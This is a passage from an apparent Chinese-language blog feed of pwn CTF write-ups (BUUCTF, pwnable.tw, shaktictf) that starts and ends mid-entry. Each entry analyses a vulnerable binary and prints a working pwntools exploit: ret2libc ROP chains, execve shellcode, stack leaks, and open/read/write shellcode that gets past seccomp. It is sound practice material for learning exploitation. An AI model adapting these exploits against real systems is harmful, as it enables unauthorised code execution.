class="hljs-keyword">import</span> *<br>offset=<span class="hljs-number">0x28</span><br>pop_rdiAddr=<span class="hljs-number">0x400733</span><br>pop_rsiAddr=<span class="hljs-number">0x400731</span><br>retAlignPadding=<span class="hljs-number">0x4004d1</span><br>targetELF=<span class="hljs-string">&quot;./BUUCTF39&quot;</span><br>targetLibc=<span class="hljs-string">&quot;./libc.so.6&quot;</span><br><br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;amd64&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>ioTube=process(targetELF)<br><span class="hljs-comment">#ioTube=gdb.debug(targetELF,&quot;b *main+149&quot;)</span><br><span class="hljs-comment">#ioTube=remote(&quot;node5.buuoj.cn&quot;,27211)</span><br><br>elf=ELF(targetELF)<br>libc=ELF(targetLibc)<br><br>pltAddr=elf.plt[<span class="hljs-string">&quot;printf&quot;</span>]<br>leakFuncName=<span class="hljs-string">&quot;__libc_start_main&quot;</span><br>gotAddr=elf.got[leakFuncName]<br>startAddr=elf.symbols[<span class="hljs-string">&quot;_start&quot;</span>]<br>formatStr=<span class="hljs-number">0x400770</span><br><br>ioTube.recvuntil(<span class="hljs-string">&quot;What&#x27;s your name? &quot;</span>)<br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*offset+p64(pop_rdiAddr)+p64(formatStr)+p64(pop_rsiAddr)+p64(gotAddr)+p64(<span class="hljs-number">0</span>)+p64(pltAddr)+p64(startAddr)+p64(retAlignPadding)<br>ioTube.sendline(payload1)<br>response=ioTube.recvuntil(<span class="hljs-string">&quot;!\nWha&quot;</span>)<br><span class="hljs-comment">#print(&quot;响应=&#123;&#125;\n&quot;.format(response))</span><br>realAddr=u64(response[-<span class="hljs-number">11</span>:-<span class="hljs-number">5</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-comment">#print(&quot;测试一下泄露的地址长啥样：&#123;&#125;\n&quot;.format(hex(realAddr)))</span><br>libcBase=realAddr-libc.symbols[leakFuncName]<br><span class="hljs-comment">#print(&quot;真实地址=&#123;&#125;，libc基地址=&#123;&#125;\n&quot;.format(hex(realAddr),hex(libcBase)))</span><br><br>sysAddr=libcBase+libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>binshAddr=libcBase+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>))<br>payload2=<span class="hljs-string">b&#x27;1&#x27;</span>*offset+p64(pop_rdiAddr)+p64(binshAddr)+p64(sysAddr)+p64(retAlignPadding)<br>ioTube.recvuntil(<span class="hljs-string">&quot;your name? &quot;</span>)<br>ioTube.sendline(payload2)<br><span class="hljs-comment">#ioTube.recvall(timeout=3)</span><br><span class="hljs-comment">#ioTube.recv()</span><br>ioTube.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn刷题记录</category>
      
      <category>ROP</category>
      
      <category>ret2libc</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF-ciscn_2019_s_9</title>
    <link href="/2025/07/27/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Shellcode/BUUCTF-ciscn-2019-s-9/"/>
    <url>/2025/07/27/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Shellcode/BUUCTF-ciscn-2019-s-9/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>BUUCTF上的一道ret2shellcode题目，链接在这：<a href="https://buuoj.cn/challenges#ciscn_2019_s_9">BUUCTF原题：ciscn_2019_s_9</a></p><span id="more"></span><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先还是拖到IDA，看到main调用了pwn函数：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Shellcode/BUUCTF-ciscn_2019_s_9/IDA-pwn.png"><br>进入pwn函数分析，如上图，因为距离返回地址偏移&#x3D;0x24&#x3D;36,而允许输入50个字符，因此存在溢出点<br><br>再看一下函数表，没找到明显的后门函数，因此考虑ret2shellcode或者ROP<br><br>之后checksec查看进一步确定方向：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Shellcode/BUUCTF-ciscn_2019_s_9/checksec.png"><br>可以看到保护全关，于是想到直接写shellcode即可<br></p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>劫持到shellcode，最关键的步骤是确定偏移和返回地址，偏移量在上面的讨论中已经确定，所以接下来只要确定返回地址即可<br><br>但是，由于开启了ASLR，不能直接把返回地址写死为栈上的某个地址，要想办法泄露地址或者让它自动跳转到shellcode<br><br>这里有一个小的做题经验：在IDA里如果看到hint函数，大概率程序中会有jmp esp这样的汇编指令，于是去反汇编的结果中搜索一下：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Shellcode/BUUCTF-ciscn_2019_s_9/jmp-esp.png"><br>顺利找到了跳转到esp的指令，因此可以无需泄露栈地址，通过esp控制执行流即可<br><br>最终的利用脚本如下：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>targetELF=<span class="hljs-string">&quot;./pwn&quot;</span><br><span class="hljs-comment">#ioTube=process(targetELF)</span><br><span class="hljs-comment">#ioTube=gdb.debug(targetELF,&quot;b *0x4006a4&quot;)</span><br>ioTube=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">29656</span>)<br>jmp_espAddr=<span class="hljs-number">0x8048554</span><br>boost=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">sub esp,40</span><br><span class="hljs-string">jmp esp</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>)<br>shellcode=<span class="hljs-string">b&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;</span><br>payload2=shellcode+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">15</span>+p32(jmp_espAddr)+boost<br>ioTube.recvuntil(<span class="hljs-string">&quot;&gt;\n&quot;</span>)<br>ioTube.sendline(payload2)<br>ioTube.recv()<br>ioTube.interactive()<br></code></pre></td></tr></table></figure><p>最后，还有一个值得注意的地方：<br><br>由于只能输入50个字节，在覆盖到返回地址后只剩下14个字节，肯定不够写shellcode，因此只能把shellcode放在缓冲区起始位置，因此在返回地址后面还需要一小段的引导代码（即脚本中的boost）<br><br>其实质上就是让esp指向shellcode，并再次jmp到esp</p>]]></content>
    
    
    <categories>
      
      <category>pwn刷题记录</category>
      
      <category>Shellcode</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>pwnable01-start</title>
    <link href="/2025/07/27/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Shellcode/pwnable01-start/"/>
    <url>/2025/07/27/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Shellcode/pwnable01-start/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>pwnable.tw上的第一题，原题链接在这：<a href="https://pwnable.tw/challenge/#1">pwnable.tw第1题：start</a><br></p><span id="more"></span><p>看题目名字猜测是一道基本的栈溢出劫持到shellcode，但是这道题对_start函数进行了处理，不能直接用IDA反编译，需要审计汇编代码<br></p><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先checksec分析程序开启了哪些保护：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Shellcode/pwnable01-start/checksec.png"><br>可以看到保护全关<br><br>接下来拖进IDA分析，如下图<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Shellcode/pwnable01-start/IDA.png"><br>发现甚至没有main函数，反编译也得不到什么信息，于是只能分析_start的汇编代码<br><br>分析之前先运行程序，结合动态行为降低阅读汇编代码的难度，如下图：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Shellcode/pwnable01-start/run.png"><br>可以看到程序仅存在一个输出和一个输入，并且从Segmentation Fault看出肯定有溢出点。<br><br>接下来以程序输出的”Let’s start the CTF:”作为线索去分析汇编代码<br><br>使用objdump，得到_start函数的反汇编代码如下：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Shellcode/pwnable01-start/disas.png"><br>主要观察到进行了两次系统调用，并且read允许最大读取60字节<br><br>这时再通过pwndbg的cyclic方法计算缓冲区到返回地址的偏移，具体方法见<a href="https://0x4a-210.github.io/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/Control-Hijack/">pwn.college题解：Control-Hijack</a><br><br>发现偏移&#x3D;20，因此可以溢出<br></p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>经过上述分析，利用方式为编写shellcode，将返回地址劫持到shellcode即可<br><br>但注意，由于从返回地址往后只剩下40个字节的机会，因此不能直接使用pwn库的shellcraft.sh()（会生成44字节的shellcode），需要自己编写shellcode<br><br>同时由于开启了ASLR，因此栈地址不再是确定的，需要想办法确定返回地址<br><br>观察到在_start的汇编代码中存在输出函数，因此想到泄露一个栈地址<br><br>再观察到汇编中存在直接把esp赋值给ecx的语句，故只要构建一个二阶段的利用方法，第一次返回到0x8048087，等待泄露出栈地址，再进行真正的溢出到shellcode即可<br><br>最终的利用脚本如下：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>targetELF=<span class="hljs-string">&quot;./start&quot;</span><br><span class="hljs-comment">#ioTube=process(targetELF)</span><br><span class="hljs-comment">#ioTube=gdb.debug(targetELF,&quot;b *0x804809c&quot;)</span><br>ioTube=remote(<span class="hljs-string">&quot;chall.pwnable.tw&quot;</span>,<span class="hljs-number">10000</span>)<br>offset=<span class="hljs-number">20</span><br>shellcode=<span class="hljs-string">b&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;</span><br>leakInstructAddr=<span class="hljs-number">0x8048087</span><br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*offset+p32(leakInstructAddr)<br>ioTube.recvuntil(<span class="hljs-string">&quot;Let&#x27;s start the CTF:&quot;</span>)<br>ioTube.send(payload1)<br>espLeakAddr=u32(ioTube.recv(<span class="hljs-number">4</span>))  <span class="hljs-comment">#返回地址+4的位置</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;esp point to &#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(espLeakAddr)))<br>returnAddr=espLeakAddr+<span class="hljs-number">20</span><br>payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">20</span>+p32(returnAddr)+shellcode<br>ioTube.send(payload2)<br>ioTube.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn刷题记录</category>
      
      <category>Shellcode</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>沙箱问题</title>
    <link href="/2025/07/26/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E6%B2%99%E7%AE%B1%E9%97%AE%E9%A2%98/"/>
    <url>/2025/07/26/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E6%B2%99%E7%AE%B1%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>之前从来没写过沙箱题，一下子遇到2道，直接懵了，记录一下<br></p><span id="more"></span><p>沙箱可以理解为一种虚拟环境，在CTF中，可以通过seccomp（Linux内核的一种特性）来实现系统调用的白名单和黑名单，从而限制程序使用某些系统调用，常见的限制为设置白名单，仅允许我们使用open、read和write<br><br>以两道题作为例子<br></p><h1 id="SeaShells"><a href="#SeaShells" class="headerlink" title="SeaShells"></a>SeaShells</h1><p>第一题是2025.07.26的shaktictf比赛里面的SeaShells题，原题链接在这：<a href="https://ctf.teamshakti.in/challenge/40">2025-07-26-shaktictf比赛原题：SeaShells</a><br></p><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>原文题目描述比较抽象，没什么有用信息，于是直接开始下载附件分析<br></p><h2 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h2><p>把ELF文件拖进IDA初步观察一下，如下图<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E6%B2%99%E7%AE%B1%E9%97%AE%E9%A2%98/SeaShells-IDA-main.png"><br>可以看到main函数逻辑很简单，是直接把我们输入的数据当作代码来执行<br><br>但是注意到左侧函数表中存在一个seccomp_initialisation的函数，想到这题应该加了沙箱，限制了我们的系统调用，大概率无法直接拿到shell<br><br>接着再对程序检查一下，使用seccomp-tools命令行工具，ubuntu22.04中安装命令如下：<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install gcc ruby-dev -y<br><span class="hljs-built_in">sudo</span> gem install seccomp-tools<br></code></pre></td></tr></table></figure><p>安装完成后使用该工具检查ELF文件：<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">seccomp-tools dump ./seashells<br></code></pre></td></tr></table></figure><p><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E6%B2%99%E7%AE%B1%E9%97%AE%E9%A2%98/seccomp-tools-check.png"><br>发现除了程序本身的系统调用，对于我们获取flag有用的只有open、read和write系统调用<br><br>由此，漏洞点清晰，需要编写一段仅使用了open、read和write系统调用的shellcode并输入即可<br></p><h2 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h2><p>file命令查看一下，发现是64位程序，因此编写出如下shellcode<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86_64&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>targetELF=<span class="hljs-string">&quot;./seashells&quot;</span><br><span class="hljs-comment"># ioTube=process(targetELF)</span><br>ioTube=remote(<span class="hljs-string">&quot;43.205.113.100&quot;</span>,<span class="hljs-number">8645</span>)<br>shellcode=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">.intel_syntax noprefix</span><br><span class="hljs-string">push 0</span><br><span class="hljs-string">mov r10,0x7478742e67616c66</span><br><span class="hljs-string">push r10</span><br><span class="hljs-string">lea rdi,[rsp]</span><br><span class="hljs-string">xor rsi,rsi</span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">mov rax,2</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rdi,rax</span><br><span class="hljs-string">sub rsp,100</span><br><span class="hljs-string">lea rsi,[rsp]</span><br><span class="hljs-string">xor rdx,rdx</span><br><span class="hljs-string">mov rdx,100</span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">xor rdi,rdi</span><br><span class="hljs-string">mov rdi,1</span><br><span class="hljs-string">lea rsi,[rsp]</span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">mov rax,1</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>ioTube.recvuntil(<span class="hljs-string">&quot;Give me the sea shells that you collected &gt;&gt;&quot;</span>)<br>ioTube.sendline(shellcode)<br>response=ioTube.recv().decode(errors=<span class="hljs-string">&quot;ignore&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag included in &#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(response))<br></code></pre></td></tr></table></figure><p>需要注意的有2点：<br><br>一是在远程中flag的文件路径需要猜测一下，一开始写的&#x2F;flag（即mov r10,67616c662f）没打通，后来改成flag.txt才打通<br><br>二是在open文件时，字符串的末尾一定要以0x00结尾（这也是为什么一开始有一条push 0指令）</p><h1 id="pwnable02-orw"><a href="#pwnable02-orw" class="headerlink" title="pwnable02-orw"></a>pwnable02-orw</h1><p>第二题是pwnable.tw上的一道题目，原题链接在这：<a href="https://pwnable.tw/challenge/#2">pwnable.tw第2题：orw</a><br></p><h2 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h2><p>这道题比上一题更简单，题目描述中给出了提示<br><br>直接告诉我们只有open、read和write可以使用，并且给出了flag的路径在&#x2F;home&#x2F;orw&#x2F;flag<br></p><h2 id="漏洞点分析-1"><a href="#漏洞点分析-1" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h2><p>下载附件后首先还是拖进IDA看一下<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E6%B2%99%E7%AE%B1%E9%97%AE%E9%A2%98/pwnable02-IDA-main.png"><br>发现逻辑就是直接执行shellcode，然后函数表里面还是有沙箱（orw_seccomp）<br><br>最后用file查看一下是32位文件<br><br>经过上述信息搜集，可以得到利用思路和上一题基本一致，只不过编写汇编语言时注意32位架构下的语法<br></p><h2 id="漏洞点利用-1"><a href="#漏洞点利用-1" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h2><p>直接编写出如下的利用脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> pwnlib.shellcraft<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>targetELF=<span class="hljs-string">&quot;./pwn&quot;</span><br><span class="hljs-comment"># ioTube=process(targetELF)</span><br>ioTube=remote(<span class="hljs-string">&quot;chall.pwnable.tw&quot;</span>,<span class="hljs-number">10001</span>)<br>shellcode=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">              push 0</span><br><span class="hljs-string">              push 0x67616c66</span><br><span class="hljs-string">              push 0x2f77726f</span><br><span class="hljs-string">              push 0x2f656d6f</span><br><span class="hljs-string">              push 0x682f2f2f</span><br><span class="hljs-string">              lea ebx,[esp]</span><br><span class="hljs-string"></span><br><span class="hljs-string">              xor ecx,ecx</span><br><span class="hljs-string">              xor edx,edx</span><br><span class="hljs-string">              </span><br><span class="hljs-string">              mov eax,5</span><br><span class="hljs-string">              int 0x80</span><br><span class="hljs-string"></span><br><span class="hljs-string">              </span><br><span class="hljs-string">              mov ebx,eax</span><br><span class="hljs-string">              mov edx,256</span><br><span class="hljs-string">              sub esp,256</span><br><span class="hljs-string">              lea ecx,[esp]</span><br><span class="hljs-string"></span><br><span class="hljs-string">              xor eax,eax</span><br><span class="hljs-string">              mov eax,3</span><br><span class="hljs-string">              int 0x80</span><br><span class="hljs-string"></span><br><span class="hljs-string">              xor ebx,ebx</span><br><span class="hljs-string">              mov ebx,1</span><br><span class="hljs-string">              mov edx,eax</span><br><span class="hljs-string">              lea ecx,[esp]</span><br><span class="hljs-string"></span><br><span class="hljs-string">              xor eax,eax</span><br><span class="hljs-string">              mov eax,4</span><br><span class="hljs-string">              int 0x80</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>ioTube.recvuntil(<span class="hljs-string">&quot;Give my your shellcode:&quot;</span>)<br>ioTube.sendline(shellcode)<br>response=ioTube.recv().decode(errors=<span class="hljs-string">&quot;ignore&quot;</span>)<br><span class="hljs-built_in">print</span>(response)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn刷题记录</category>
      
      <category>其他技巧类</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2025-07-26-shaktictf-Amogus</title>
    <link href="/2025/07/26/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/2025-07-26-shaktictf-Amogus/"/>
    <url>/2025/07/26/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/2025-07-26-shaktictf-Amogus/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>一道shaktictf比赛上的题目，链接在这<a href="https://ctf.teamshakti.in/challenge/41">7月26日shaktictf比赛：Amogus原题</a></p><span id="more"></span><p>原本的英文题目描述如下：<br><br>I always end up dying in this Amogus game… before I even get a chance to properly play! Ugh!<br><br>Is there any way I can escape this cruel fate?<br><br>大概意思就是目标二进制程序是模拟一个游戏，但是每次一开始就会死亡，需要我们找到办法正确启动游戏（避免死亡）<br></p><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>反正光看描述是云里雾里的，只能猜到应该是要绕过一个什么验证<br><br>于是直接把附件给的ELF拖到IDA里面看下：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/2025-07-26-shaktictf-Amogus/main.png"><br>首先如上图，在IDA里观察main函数调用了一个gameplay函数，联想到题目描述，导致“死亡”的元凶应该在这个gameplay里面，追踪进去看一下：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/2025-07-26-shaktictf-Amogus/gameplay.png"><br>分析这个函数可以发现，需要v4变量&#x3D;”ALIVE”才能获得flag，但是在校验之前v4有一个将”DEAD”拷贝给v4的操作，看起来似乎v4必定会&#x3D;“DEAD”<br><br>但是，注意到第11行的字符串拷贝语句，由于strcpy不会检查长度，而是遇到0字节停止，而恰好dest缓冲区在v4下方，而参数a1又是攻击者可控的，因此可以通过dest溢出将v4覆盖为”ALIVE”<br></p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>dest缓冲区16个字节，只需要填满dest缓冲区，再加上”ALIVE”，最后以0字节截断即可<br><br>由此构造的payload&#x3D;b’1’*16+b”ALIVE”+b’\x00’，最终的利用脚本如下：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86_64&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>targetELF=<span class="hljs-string">&quot;./pwn&quot;</span><br><span class="hljs-comment"># ioTube=process(targetELF)</span><br>ioTube=remote(<span class="hljs-string">&quot;43.205.113.100&quot;</span>,<span class="hljs-number">8027</span>)<br>payload=<span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">16</span>+<span class="hljs-string">b&quot;ALIVE&quot;</span>+<span class="hljs-string">b&#x27;\x00&#x27;</span><br>ioTube.recvuntil(<span class="hljs-string">&quot;Enter your name:\n\n&quot;</span>)<br>ioTube.sendline(payload)<br>response=ioTube.recv().decode(errors=<span class="hljs-string">&quot;ignore&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag included in &#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(response))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn刷题记录</category>
      
      <category>其他技巧类</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF-picoctf_2018_rop_chain</title>
    <link href="/2025/07/26/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2text/BUUCTF-picoctf-2018-rop-chain/"/>
    <url>/2025/07/26/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2text/BUUCTF-picoctf-2018-rop-chain/</url>
    
